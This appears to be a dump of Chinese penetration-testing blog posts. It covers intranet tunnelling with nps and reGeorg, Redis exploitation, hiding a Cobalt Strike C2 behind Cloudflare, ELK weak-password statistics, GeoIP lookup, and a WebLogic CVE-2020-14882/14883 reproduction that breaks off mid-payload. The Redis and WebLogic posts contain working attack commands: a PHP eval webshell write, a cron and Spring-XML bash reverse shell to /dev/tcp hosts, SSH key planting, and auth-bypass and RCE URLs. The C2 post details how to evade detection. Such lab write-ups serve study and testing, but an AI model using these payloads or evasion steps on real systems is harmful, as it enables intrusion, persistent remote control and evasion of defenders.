对于windows，管理员身份运行cmd，进入安装目录 nps.exe install nps默认配置文件使用了80，443，8080，8024端口 80与443端口为域名解析模式默认端口 8080为web管理访问端口 8024为网桥端口，用于客户端与服务器通信 启动 对于linux|darwin sudo nps start 对于windows，管理员身份运行cmd，进入程序目录 nps.exe start windows配置文件位于 C:\\Program Files\\nps linux和darwin位于/etc/nps 主要是配置文件中要改一改，尤其是账号密码 /conf/nps.conf 2.3.3、实际使用192.168.31.146启动服务端 sudo nps start 访问：192.168.31.146:8080 默认密码：admin/123 进入主界面 添加客户端：192.168.31.163 通过下面的命令启动客户端，记得使用管理员cmd npc.exe -server=192.168.31.146:8024 -vkey=ss5hr5jqny68k18s -type=tcp 成功上线 （1）、端口映射 点击右方的隧道 将我本机的3389端口映射到服务器的8888端口，那么远程连接服务器的8888端口，就是本机的3389 添加成功 然后连接：服务器:8888即可成功。 之前是成功了，但是没截图。后面本机的远程桌面出了点问题，就不截图了。 在实际运用中，服务端部署在公网VPS上即可。 （2）、socks代理 设置客户端ID和端口即可 然后设置代理为服务器:989即可。 （3）、二级代理 首先主机A作为服务端，主机B作为客户端 建立一个socks隧道到主机A的989端口。 VPS作为服务端，主机A作为客户端 映射A的989端口到VPS的10000端口 设置代理为VPS:10000，就能访问到C的web服务了 （4）、三级代理 B作为服务端口，D作为客户端 D建立一个Socks隧道到B的989端口 A作为服务端，B作为客户端 B将989端口映射到A的999端口 VPS作为服务端口，A作为客户端 A将999端口映射到B的10000端口 然后设置代理为VPS的10000端口，即可访问到C的web服务了 2.4、regeorg2.4.1、介绍​ 当目标只有一个端口能访问内网，其他端口不出网的情况下使用。通过上传脚本文件到web服务器，通过python2设置代理为该脚本地址来进行内网探测。 2.4.2、参数介绍-p 代理监听端口 -u 脚本地址 2.4.3、实际使用首先，上传隧道脚本文件(aspx|ashx|jsp|php) 到web服务器 本地运行 python2 reGeorgSocksProxy.py -p 8888 -u http://目标:8080/tunnel/tunnel.jsp 然后我们设置socks代理为127.0.0.1:8888就可以进入内网了 2.5、Proxifier2.5.1、介绍​ Proxifier是一款功能非常强大的socks5客户端，可以让不支持代理服务器工作的程序变的可行。支持各种操作系统和各代理协议，它的运行模式可以指定端口，指定程序的特点。在内网穿透过程中常用来进行socks代理。 2.5.2、实际使用添加代理服务器 设置好ip、端口、[账号、密码] 添加好代理服务器后，设置代理规则 规则的优先级是从上到下 新加了一个规则，远程桌面连接的程序（mstsc.exe），走我设置的代理服务器。 这样我们进行远程连接的时候就能看到具体连接与结果，因为我没有建立搭隧道，所以是连接失败的。 通过之前的工具建立隧道后，设置代理服务器为VPS:port，即可畅游内网 三、总结​ 本文主要介绍了内网穿透中所需要的工具与使用方法，写的有些仓促，如存在什么不足或补充，请邮件联系我。谢谢！ ​","categories":[],"tags":[{"name":"frp","slug":"frp","permalink":"https://k3vi-07.github.io/tags/frp/"},{"name":"ew","slug":"ew","permalink":"https://k3vi-07.github.io/tags/ew/"},{"name":"reGeorg","slug":"regeorg","permalink":"https://k3vi-07.github.io/tags/regeorg/"}],"author":"诚默"},{"title":"redis漏洞总结","slug":"redis漏洞总结","date":"2021-07-26T13:39:25.000Z","updated":"2023-01-10T07:58:11.021Z","comments":true,"path":"2021/07/26/redis漏洞总结/","link":"","permalink":"https://k3vi-07.github.io/2021/07/26/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"一、Redis介绍Redis是一个开源的高性能键值数据库。最热门的NoSq数据库之一，也被人们称为数据结构服务器。 默认端口：6379 可能存在的漏洞：未授权访问、主从复制 二、Redis相关漏洞利用2.1、未授权访问2.1.1、存在原因未设置密码或者设置弱密码","text":"一、Redis介绍Redis是一个开源的高性能键值数据库。最热门的NoSq数据库之一，也被人们称为数据结构服务器。 默认端口：6379 可能存在的漏洞：未授权访问、主从复制 二、Redis相关漏洞利用2.1、未授权访问2.1.1、存在原因未设置密码或者设置弱密码 bind 127.0.0.1 被注释了，所有机器都可以访问 protected-mode no 关闭安全模式 使用root权限 等 （被攻击机器）靶机安装好一个redis后，修改redis.conf后以root权限启动。 2.1.2、常用命令 查看信息：info 删除所有数据库內容：flushable 刷新数据库：flush 看所有键：KEYS*，使用 select nun可以查看键值数据。 设置变量：set test“who am i config set dir dirpath设置路径等配置 config get dir/filename获取路径及数据配置信息 save保存 get变量，查看变量名称 删除Key：DEL KEY_NAME 2.1.3、利用方法（1）获取数据库信息 redis-cli -h 192.168.31.152 即可成功进入到目标（192.168.31.152）redisl 查看redis版本相关信息，也判断是否存在密码 info 成功显示信息代表没有密码 获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。 CONFIG GET dir #设置目录 CONFIG GET dbfilename #设置文件名 （2）写webshell config set dir /var/www/html/ #切换目录到网站的根目录（根据实际情况来） set x \"\\n\\n\\n&lt;?php phpinfo();?&gt;\\n\\n\\n\" #写入恶意代码phpinfo() set xx \"\\n\\n\\n&lt;?php @eval($_POST['-7']);?&gt;\\n\\n\\n\" #写入一句话木马 config set dbfilename shell.php #生成木马文件shell.php save #进行保存 成功写入到目标机 （3）写定时任务反弹shell 先在自己的服务器上监听一个端口 nc -lvnp 9999 #攻击机监听自己的7999端口 redis-cli -h 192.168.31.152 #进入对方redis set xx \"\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.31.116/7999 0&gt;&amp;1\\n\" #设置变量值为反弹shell语句 config set dir /var/spool/cron/ #设置目录为目标机定时任务目录 config set dbfilename root #设置文件名 save #保存 写入成功 但是一直nc没有接收到 查了下是因为存在乱码，centos会忽略乱码去执行格式正确的任务计划而ubuntu并不会忽略这些乱码，所以导致命令执行失败推荐可以亲自验证一下 （4）写入Linux ssh-key公钥，然后通过私钥直接登录。 攻击机：192.168.31.116 生成密钥 ssh-keygen -t rsa 将公钥内容导出到文本中 (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") &gt; key.txt 写入目标机器 cat key.txt | redis-cli -h 192.168.31.152 -x set xxx 设置路径、文件名保存，路径根据实际情况来改动 写入成功 ssh -i id_rsa 192.168.31.152 登录成功 2.2、主从复制2.2.1、漏洞版本主从复制存在漏洞的版本 Redis &lt;= 5.0.5 2.2.2、环境部署docker pull damonevking/redis5.0 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 2.2.3、攻击原理Redis是一个使用ANSIC编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。 但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。 2.2.4、利用方式利用脚本 https://github.com/n0b0dyCN/redis-rogue-server 运行后可直接进行命令执行 python3 redis-rogue-server.py --rhost 192.168.31.152 --lhost 192.168.31.146 --exp=exp.so 脚本相关，看github上的脚本介绍即可。 三、总结​ 周末写的有些仓促，如果文章中存在什么问题，敬请指正。​ 以上仅供学习交流，严禁用于违法途径（手动狗头）。","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://k3vi-07.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"redis","slug":"redis","permalink":"https://k3vi-07.github.io/tags/redis/"}],"author":"诚默"},{"title":"Cobalt Strike 主机隐藏教程","slug":"主机隐藏教程","date":"2021-03-03T01:43:57.000Z","updated":"2023-01-10T07:57:26.377Z","comments":true,"path":"2021/03/03/主机隐藏教程/","link":"","permalink":"https://k3vi-07.github.io/2021/03/03/%E4%B8%BB%E6%9C%BA%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B/","excerpt":"Cobalt Strike 主机隐藏 根据现有检测机制，来对服务器进行隐藏，减少c2服务器被检测到的几率。文章最初发表在freebuf https://www.freebuf.com/articles/network/262445.html CDN：cloudflare服务器：阿里云香港 debian10 amd64证书：let’s encrypt 免费证书域名：dot.tk免费域名CS：CobaltStrike 4.2","text":"Cobalt Strike 主机隐藏 根据现有检测机制，来对服务器进行隐藏，减少c2服务器被检测到的几率。文章最初发表在freebuf https://www.freebuf.com/articles/network/262445.html CDN：cloudflare服务器：阿里云香港 debian10 amd64证书：let’s encrypt 免费证书域名：dot.tk免费域名CS：CobaltStrike 4.2 1、 CS服务端配置上传CS到服务器，配置java坏境等步骤略。需要做的操作分别为：禁ping、修改默认端口、修改客户端连接证书。 1.1 服务器禁ping当服务器禁ping后，从某种角度可以判定为主机为不存活状态。 1.1.1 修改系统配置。编辑文件/etc/sysctl.conf，在里面增加一行。 net.ipv4.icmp_echo_ignore_all=1之后使命命令sysctl -p使配置生效之后在ping就无法ping通了。这种方式nmap还是可以扫描到服务器的存活的。 1.1.2 云服务器防火墙（安全组）使用云服务器防火墙的方式可以更好的控制流量不流向云服务器本身。从外层入口阻断流量。前提是需要你的服务器为ecs服务器，不能我这种轻量级主机。具体的操作这里就不记录操作了。毕竟我也没有这样还样的服务器。 1.2 修改端口编辑teamserver文件，搜索50050，将其改为任意端口即可，这里改成53389。保存退出再次启动时端口就变化了。 1.3 修改默认证书因为cs服务端生成的证书含有cs的相关特征所有，这里进行修改替换。修改方式有两种，分别为生成密钥库和修改启动文件。无论是那种方式都需要删去原有的文件cobaltstrike.store 1.3.1 方法一生成证书 删除密钥库文件cobaltstrike.store 使用命令keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu -dname \"CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\\, Ltd, L=beijing, S=beijing, C=CN\"可以生成新的密钥库文件 使用命令keytool -list -keystore cobaltstrike.store 查看证书 启动服务器查看证书签名是否相同。 1.3.2 方法二修改文件teamserver 是启动cs服务端的启动文件。里面有环境检测的部分，其中就包括密钥库的检测，这部分的写法是，如检测不到密钥库就使用命令生成新的密钥库，修改这里生成命令。 将其改为keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname \"CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\\, Ltd, L=Beijing, S=Beijing, C=CN\"删除原有的./cobaltstrike.store密钥库文件，下次启动时会自动生成新的密钥库文件。这个密钥库也可以使用下面通过cloudflare申请的密钥库代理。 2、使用CDN隐藏cs生成的木马中会带有服务器的部分信息如IP、域名，使用cdn就可以很好的隐藏住这部分信息，并且在一定程度上可以规避杀毒软件的主机特征查杀。并且在其他大佬的文章中看到https的监听方式中不会采用cobaltstrike.store的密钥库。所以这里申请一个证书代替https监听方式中的默认证书。 2.1 申请免费域名使用免费域名的好处是不会有过多的信息记录下来。访问https://www.freenom.com/zh/index.html注册，可以免费使用一年。具体注册疑问可以参考知乎文章 https://zhuanlan.zhihu.com/p/115535965 选择时长，免费12个月注册成功 这里我们用域名dotdotdotdot.tk做演示，演示结束后一段时间后删除域名。 2.2 CDN配置cdn部分可以选择其实挺多的，这里选择的是cloudflare。1、注册账号2、添加站点、选择免费计划、之后会扫描dns记录3、修改dotdotdotdot.tk的dns服务器为cloudflare。修改完成后需要一定的时间生效4、关闭自动https重写和始终使用https、broti压缩5、出现如下界面就设置生效，可以使用cloudflare进行域名解析操作了。6、解析一个baidu.dotdotdotdot.tk测试一下。7、解析域名到你的vps上，配置如下。代理状态为已代理，这样所有的流量会流经cdn。 ping baidubaidu.dotdotdotdot.tk 此时CDN已经生效8、配置SSL/TLS加密模式为完全 2.3 cloudflare生成证书在cloudflare的dash页面找到SSL/TLS-&gt;源服务器-&gt;创建证书，之后将公钥和私钥保存下来，分别为server.pem和server.key。一定要在生成的时候保存，不然可能找不到私钥了。 2.3.1 申请证书并打包密钥库将证书打包并生成store文件openssl pkcs12 -export -in server.pem -inkey server.key -out baidubaidu.dotdotdotdot.tk.p12 -name baidubaidu.dotdotdotdot.tk -passout pass:123456keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore baidubaidu.dotdotdotdot.tk.store -srckeystore baidubaidu.dotdotdotdot.tk.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias baidubaidu.dotdotdotdot.tk 2.4 配置证书到https的监听方式中。要想使用我们自己申请的证书，这里就需要使用‘Malleable C2 profile’的方式来操作。这里以cloudflare.profile为例。将生成的密钥文件.store放到cs目录下，想cloudflare.profile加入证书配置：其中需要注意的是https-certificate为证书相关的配置，其他client.header中Host的值要为我们申请的域名，其他的部分，根据个人情况去配置。 https-certificate { set keystore \"baidubaidu.dotdotdotdot.tk.store\"; set password \"123456\"; } http-stager { set uri_x86 \"/api/1\"; set uri_x64 \"/api/2\"; client { header \"Host\" \"baidubaidu.dotdotdotdot.tk\";} server { output{ print; } } } http-get { set uri \"/api/3\"; client { header \"Host\" \"baidubaidu.dotdotdotdot.tk\"; metadata { base64; header \"Cookie\"; } } server { output{ print; } } } http-post { set uri \"/api/4\"; client { header \"Host\" \"baidubaidu.dotdotdotdot.tk\"; id { uri-append; } output{ print; } } server { output{ print; } } } 使用命令”./c2lint cloudflare.profile”去验证配置文件是否有问题。如下为验证成功的配置。验证配置失败，会爆出如下错误，根据报错结果去修改你的配置文件。配置文件参考官方帮助文件使用配置文件启动服务器./teamserver 172.17.21.142 123456 cloudflare.profile 2.5 配置文件生成仓库github上有一个仓库，可以用于生成c2配置文件，如果使用此种方式需要在木马生成部分的备注，不然可能会导致木马无法上线。使用方式： #安装命令 git clone https://github.com/FortyNorthSecurity/C2concealer &amp;&amp; cd C2concealer &amp;&amp; chmod +x install.sh &amp;&amp; ./install.sh #使用命令 C2concealer --variant 1 --hostname \"baidubaidu.dotdotdotdot.tk\" #域名记得加引号 baidu.store就是baidubaidu.dotdotdotdot.tk.store为了方便就改了文件名。之后使用生成后的profile文件启动服务器即可 2.6 生成木马配置作了如上的配置，在生成木马时需要做一些不一样的操作。注意： 免费版本的cloudflare支持解析少量的端口，具体端口如下http: 80、8080、8880、2052、2082、2086、2095https: 443、2053、2083、2087、2096、8443之后生成木马，运行即可上线 powershell的上线方式与以前有些许不同。需要启动ssl证书。 备注：如果使用C2concealer生成profile，需要配置listener时在profile中选择variant_1才行，不然可能会导致无法上线。 3、写在最后1、服务器防火墙，c2上线端口只能让cdn的IP访问，这样可以避免被扫描器扫描到，将你的IP加入威胁情报中去。具体配置可以在云服务器安全组操作。或者在服务器使用iptables操作。2、证书申请这部分我走了很多的弯路，之前打算使用let’s Encrypt后来发现无论怎么操作都无法上线，3、实际上这些操作都是服务器本身的隐藏，要想更好的使用CobaltStrike可能还需要做免杀，做木马文件签名等操作。4、这些配置做完后，及时服务器不在继续使用，也可以将文件打包拷贝到新服务器中，后面只需更新DNS解析即可。 cloudflare 使用的IP段全部IP段 173.245.48.0/20 103.21.244.0/22 103.22.200.0/22 103.31.4.0/22 141.101.64.0/18 108.162.192.0/18 190.93.240.0/20 188.114.96.0/20 197.234.240.0/22 198.41.128.0/17 162.158.0.0/15 104.16.0.0/12 172.64.0.0/13 131.0.72.0/22 国内IP段是cloudflare与百度云合作的节点 162.159.211.4-103 103.21.244.0/22 103.22.200.0/22 103.31.4.0/22 104.16.0.0/12 108.162.192.0/18 131.0.72.0/22 141.101.64.0/18 162.158.0.0/15 172.64.0.0/13 173.245.48.0/20 188.114.96.0/20 190.93.240.0/20 197.234.240.0/22 198.41.128.0/17 参考链接 https://blog.csdn.net/god_zzZ/article/details/109057803 https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/ https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy","categories":[],"tags":[{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"https://k3vi-07.github.io/tags/cobaltstrike/"}],"author":"k3vi"},{"title":"使用ELK搭建密码统计库","slug":"使用elk搭建密码统计库","date":"2021-01-25T02:05:22.000Z","updated":"2023-01-10T07:56:51.011Z","comments":true,"path":"2021/01/25/使用elk搭建密码统计库/","link":"","permalink":"https://k3vi-07.github.io/2021/01/25/%E4%BD%BF%E7%94%A8elk%E6%90%AD%E5%BB%BA%E5%AF%86%E7%A0%81%E7%BB%9F%E8%AE%A1%E5%BA%93/","excerpt":"使用elk搭建密码top统计库 elk本身是非常强大的日志处理系统，分别由elasticsearch、logstash、kibana构成，功能分别是数据库、数据处理、前端展示。利用这些搭建一套用于密码topN统计的系统。当然要完成这种统计需要强大的处理性能。 搭建基础环境基础环境 操作系统： ubuntu 20.4 64位 内存：16G 硬盘：2T数据盘，128G ssd系统盘 ElasticSearch：7.10.1 Kibana：7.10.1 Logstash：7.10.1","text":"使用elk搭建密码top统计库 elk本身是非常强大的日志处理系统，分别由elasticsearch、logstash、kibana构成，功能分别是数据库、数据处理、前端展示。利用这些搭建一套用于密码topN统计的系统。当然要完成这种统计需要强大的处理性能。 搭建基础环境基础环境 操作系统： ubuntu 20.4 64位 内存：16G 硬盘：2T数据盘，128G ssd系统盘 ElasticSearch：7.10.1 Kibana：7.10.1 Logstash：7.10.1 1、elasticsearch 解压文件，tar -zxvf elasticsearch*.tar.gz，切换目录到elasticsearch中，之后所有关于elasticsearch的设置基本发生在此目录中 修改配置文件，conf/elasticsearch.yml 建议修改如下 配置 ----------路径---------- 根据实际情况做修改 #数据存储路径 #path.data: /path/to/data #日志文件路径 #path.logs: /path/to/logs ----------内存---------- #在启动过程中是否为内存加锁: bootstrap.memory_lock: true 请保证 `ES_HEAP_SIZE` 环境变量的设置大约为系统可用内存的一半 ----------网络----------- #绑定IP地址，单机搭建的情况建议改成127.0.0.1， network.host：127.0.0.1 http.port:9200 启动elasticsearch 通过命令./bin/elasticsearch 直接启动，以前台的形式运行。通过命令curl 127.0.0.1:9200查看是否启动成功。 但是可以在使用过程中会报错，就是内存不足。此时需要修改jvm的大小。这个大小建议改成实际内存的一半。比我的电脑实际内存为16G，这里我用的就是8g。 文件位置：./config/jvm.options -Xms8g -Xmx8g 之后使用命令nohup ./bin/elasticsearch &amp;以后台的方式运行ES 2、Kibana下载kibana 解压文件，tar -zxvf kibana*.tar.gz，切换目录到kibana中，之后所有关于kibana的设置基本发生在此目录中。 kibana配置文件位置./config/kibana.yml #监听端口 server.port: 5601 #默认配置 #IP配置 server.host: 0.0.0.0 #建议改成全部网卡 #elasticsearch 地址 elasticsearch.hosts:[\"http://localhost:9200\"] #根据实际情况配置，我上面配置的是localhost也就是127.0.0.1 之后通过命令nohup ./bin/kibana &amp;在后台运行kabana，通过host:5601在浏览器访问kibana 3、logstash 添加数据实际上比较好用的方式是使用logstash进行数据导入，这种方式可以根据自己的实际情况，编写数据格式，定制化高，但是有一定的难度。实际上logstash也是整个部分中最重要的地方，就是数据导入，通过logstash可以将各种类型的数据格式后后导入到ES 中存储。 3.1 基础知识下载logstash 解压文件，tar -zxvf logstash*.tar.gz，切换目录到logstash中，之后所有关于logstash的设置基本发生在此目录中。 开始进行数据 导入前，我们先理解一个东西，logstash实际上是用来收集日志并进行格式化处理的一个工具，集input、filter和output等插件 input可以接受来自beat（elk中一个轻量级的客户端，有多种beat，有兴趣的朋友可以自行了解）、日志文件、syslog等方式收集的日志。具体的可以参考官方手册https://www.elastic.co/guide/en/logstash/current/input-plugins.html。我们这里使用的是file插件。 filter可以使用grok、json、xml等方式格式化数据，根据实际情况选择某种方式具体的可以参考官方手册https://www.elastic.co/guide/en/logstash/current/filter-plugins.html。我们这里使用的主要是grok，可以根据文件情况编写不同的正则表达式来处理文件。 output实际上是结果的输出，也支持多种插件如syslog、csv、file等，具体参考官方手册https://www.elastic.co/guide/en/logstash/current/output-plugins.html ，我们这里使用的elasticsearch，将结果输出到es中。 3.2 简单的配置示例文件weakpass.txt admin----123456 admin----admin admin----1 admin----12345 test----123 test----test test----1234 …… config 目录下有个名为lostash-sample.conf的示例文件 # Sample Logstash configuration for creating a simple # Beats -&gt; Logstash -&gt; Elasticsearch pipeline. #数据源也就是输入配置 input { #这里使用的是beats插件 beats { port =&gt; 5044 } } #数据输出使用的是elasticsearch插件 output { elasticsearch { hosts =&gt; [\"http://localhost:9200\"] index =&gt; \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" #user =&gt; \"elastic\" #password =&gt; \"changeme\" } } 我们根据上面的示例文件配置一个weakpass.conf文件 input{ file { #要导入的示例文件 path =&gt; \"path/weakpass.txt\" #开始位置 start_position =&gt; \"beginning\" } } filter{ grok{ match =&gt; { #格式化数据 \"message\"=&gt;\"(?&lt;name&gt;.*?)----(?&lt;pwd&gt;.*)\" } } } output{ #使用debug将结果输出到屏幕中 stdout { codec =&gt; rubydebug } } 使用命令 ./bin/logstash -f config/weakpass.conf来使用我们写的配置文件导入数据。 如果运行命令之后没有数据输出，建议删除**./data**的所有文件，一定要看清楚目录。 3.3 垃圾数据剔除为了减少数据的冗余度及硬盘空间的大小，所以我们要根据情况删除一些无用字段，如path、message、host等。我们在gork中加入配置 remove_field=&gt;[\"path\",\"message\",\"host\"] 通过这样的配置，我们的数据量就减少了，其实时间戳也是可以删除了，而且并没有存在的意义，每条记录都带一个时间戳，实在是占用硬盘 空间。 3.4 数据导入ES因为我们是在测试，所有使用的文件一直是weakpass.txt，logstash存在一个问题，处理过一次的数据，不会重复处理（描述不一定正确）。所有建议清空data目录。再进行下面的操作。 修改配置文件如下 input{ file { #要导入的示例文件 path =&gt; \"/media/k2/5fcda6c4-e009-41dd-a314-c54c3c55126b/elk/weakpass1.txt\" start_position =&gt; \"beginning\" } } filter{ grok{ match =&gt; { #格式化数据 \"message\"=&gt;\"(?&lt;name&gt;.*?)----(?&lt;pwd&gt;.*)\" } remove_field=&gt;[\"path\",\"message\",\"host\",\"@timestamp\"] #设置标签，当我们数据量比较多的时候可以区分数据 add_tag =&gt; \"weakpass\" } } output{ #使用debug将结果输出到屏幕中 #stdout{ codec =&gt; rubydebug} elasticsearch{ action =&gt; \"index\" index =&gt; \"weakpass\"#索引名称 hosts =&gt; [\"127.0.0.1:9200\"] #ES地址 } } 3.5 使用kinaba之后我们就可以在kibana中的索引管理中看到我们的索引 这是我们就可以根据所以创建索引模式了 创建完成后就可以在discover中检索数据了 比如我们输入1，就可以检索到所有跟1相关的数据， 我们也可以检索用户名为admin的数据，这个就之会出来用户名为admin的用户了 统计密码排行使用kibana的dashboard可以统计密码排行 创建Data Table,选择源为我们上面创建的，之后进行如下的配置 这样我们就得到了上面排名了。因为数据比较少，所以统计速度快，这里就做了演示，没有进行更多的数据导入了。 优化优化存储由于logstash在导入数据中会加入一些无用的字段，这些字段会在每一条记录中都出现，所以可以删除来减少服务器的存储空间。 path 原始路径 message 完整记录 host 主机名 @timestamp 时间戳 input{} filter{ grok{ match =&gt; { #格式化数据 \"message\"=&gt;\".*\" } remove_field=&gt;[\"path\",\"message\",\"host\",\"@timestamp\"] #设置标签 add_tag =&gt; \"weakpass\" } } output{} 优化索引由于我们要导入不同的口令文件，所以我们要为后面的检索做好准备，这里我们就要根据导入内容的不同在output部分写上不同类型的索引，方便后面做检索使用。 output{ #使用debug将结果输出到屏幕中 # stdout{ codec =&gt; rubydebug} elasticsearch{ action =&gt; \"index\" index =&gt; \"weakpass-mail-111\" # 索引名 hosts =&gt; [\"127.0.0.1:9200\"] } } index =&gt; 索引名，如果我们要导入的密码包括不同类型，这里抖机灵一下，写上不同的类型，如weakpass-mail-1、weakpass-q-1、weakpass-b-1，这样我们在利用kibana进行创建索引样式时就可以创建weakpass*这一类的样式了。之后便可以在discover中选择对应的pattern来检索某一类数据。其实很有意思。","categories":[],"tags":[{"name":"elk","slug":"elk","permalink":"https://k3vi-07.github.io/tags/elk/"}],"author":"k3vi"},{"title":"使用python获取ip地址归属地","slug":"使用python获取ip地址归属地","date":"2020-12-26T08:40:05.000Z","updated":"2023-01-10T07:57:03.126Z","comments":true,"path":"2020/12/26/使用python获取ip地址归属地/","link":"","permalink":"https://k3vi-07.github.io/2020/12/26/%E4%BD%BF%E7%94%A8python%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80%E5%BD%92%E5%B1%9E%E5%9C%B0/","excerpt":"","text":"ip地址归属使用geoip的ip地址库 import geoip2.database import os class Ip2Locate(object): def __init__(self,ip): self.ip = ip @property def locate(self): databasesPath = os.path.join(os.path.abspath(os.path.dirpath(__file__)),'databases','GeoLite2-City.mmdb')# database path reader = geoip2.database.Render(databasesPath) try: response = reader.city(self.ip) except: return country_iso_code = response.country.iso_code # 国家缩写 eg: US country = response.country.names['zh-CN'] # 国家（中文）eg: 美国 province = response.subdivisions.most_specific.names['zh-CN'] # 省份，州 （中文）eg: 明尼苏达州 province_iso_code = response.subdivisions.most_specific.iso_code #省份简写 eg: MN city = response.city.names['zh-CN'] #城市名，（中文）eg: 明尼阿波利斯 latitude = response.location.latitude # 纬度 longitude = response.location.longitude # 经度 locate_info = {\"country_iso_code\":country_iso_code, \"country\":country, \"province\":province, \"province_iso_code\":province_iso_code, \"city\":city, \"latitude\":latitude, \"longitude\":longitude } return locate_info","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://k3vi-07.github.io/tags/python/"}]},{"title":"CVE-2020-1488214883复现","slug":"cve-2020-1488214883复现","date":"2020-12-03T07:29:00.000Z","updated":"2023-01-10T07:57:34.597Z","comments":true,"path":"2020/12/03/cve-2020-1488214883复现/","link":"","permalink":"https://k3vi-07.github.io/2020/12/03/cve-2020-1488214883%E5%A4%8D%E7%8E%B0/","excerpt":"1、漏洞来源Weblogic Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。","text":"1、漏洞来源Weblogic Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。 CVE-2020-14883: 权限绕过漏洞 远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console CVE-2020-14882: 代码执行漏洞 结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。 2、影响版本weblogic 10.3.6.0.0 weblogic 12.1.3.0.0 weblogic 12.2.1.3.0 weblogic 12.2.1.4.0 weblogic 14.1.1.0.0 3、环境搭建（1）Linux vulhub已经更新了这个环境 cd vulhub/weblogic/CVE-2020-14882/ docker-compose up -d （2）win10 链接：https://pan.baidu.com/s/1fCndQa1b1rahjrqGvLOybg 提取码：8888 由于时间原因，我只复现了linux环境部署 4、漏洞利用4.1、CVE-2020-14883：权限绕过通过以下路径越权进入控制台 /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29 4.2、CVE-2020-14882: 代码执行漏洞1、命令执行 /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27命令%27);%22); 创建文件 /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/poc%27);%22); 前台显示404，后台已写入 2、加载执行远端xml文件 通过FileSystemXmlApplicationContext()加载并执行远端xml文件： /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(“地址“) Linux反弹shell &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;/bin/bash&lt;/value&gt; &lt;value&gt;-cc&lt;/value&gt; &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; win10打开计算器 &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;cmd&lt;/value&gt; &lt;value&gt;/c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[calc]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 通过这个方法也可写入文件 &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; 